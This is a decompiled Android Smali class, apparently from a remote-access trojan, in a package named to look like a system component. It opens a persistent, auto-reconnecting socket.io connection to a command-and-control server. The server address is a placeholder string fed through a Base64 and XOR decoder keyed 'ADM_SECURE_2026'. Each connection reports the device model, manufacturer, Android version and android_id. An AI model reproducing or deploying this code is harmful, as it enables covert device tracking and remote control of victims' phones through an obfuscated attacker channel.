.class public Lcom/system/android/ui/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static ourInstance:Lcom/system/android/ui/IOSocket;


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 10
    new-instance v0, Lcom/system/android/ui/IOSocket;

    invoke-direct {v0}, Lcom/system/android/ui/IOSocket;-><init>()V

    sput-object v0, Lcom/system/android/ui/IOSocket;->ourInstance:Lcom/system/android/ui/IOSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 4

    .line 15
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 18
    :try_start_0
    invoke-static {}, Lcom/system/android/ui/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 19
    .local v0, "deviceID":Ljava/lang/String;
    new-instance v1, Lio/socket/client/IO$Options;

    invoke-direct {v1}, Lio/socket/client/IO$Options;-><init>()V

    .line 20
    .local v1, "opts":Lio/socket/client/IO$Options;
    const/4 v2, 0x1

    iput-boolean v2, v1, Lio/socket/client/IO$Options;->reconnection:Z

    .line 21
    const-wide/16 v2, 0x1388

    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelay:J

    .line 22
    const-wide/32 v2, 0x3b9ac9ff

    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 24
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "C2_HOST_LINK_HERE"

    invoke-direct {p0, v3}, Lcom/system/android/ui/IOSocket;->decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v3}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "&manf="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "&release="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "&id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v1}, Lio/socket/client/IO;->socket(Ljava/lang/String;Lio/socket/client/IO$Options;)Lio/socket/client/Socket;

    move-result-object v2

    iput-object v2, p0, Lcom/system/android/ui/IOSocket;->ioSocket:Lio/socket/client/Socket;

    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    .line 27
    .end local v0    # "deviceID":Ljava/lang/String;
    .end local v1    # "opts":Lio/socket/client/IO$Options;
    goto :goto_0

    .line 25
    :catch_0
    move-exception v0

    .line 26
    .local v0, "e":Ljava/net/URISyntaxException;
    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V

    .line 28
    .end local v0    # "e":Ljava/net/URISyntaxException;
    :goto_0
    return-void
.end method

.method private decode(Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    const/4 v0, 0x0

    invoke-static {p1, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object p1

    const-string v0, "ADM_SECURE_2026"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    array-length v1, p1

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v1, :cond_0

    aget-byte v3, p1, v2

    array-length v4, v0

    rem-int v4, v2, v4

    aget-byte v4, v0, v4

    xor-int/2addr v3, v4

    int-to-byte v3, v3

    aput-byte v3, p1, v2

    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_0
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, p1}, Ljava/lang/String;-><init>([B)V

    return-object v0
.end method

.method public static getInstance()Lcom/system/android/ui/IOSocket;
    .locals 1

    .line 32
    sget-object v0, Lcom/system/android/ui/IOSocket;->ourInstance:Lcom/system/android/ui/IOSocket;

    return-object v0
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 1

    .line 36
    iget-object v0, p0, Lcom/system/android/ui/IOSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
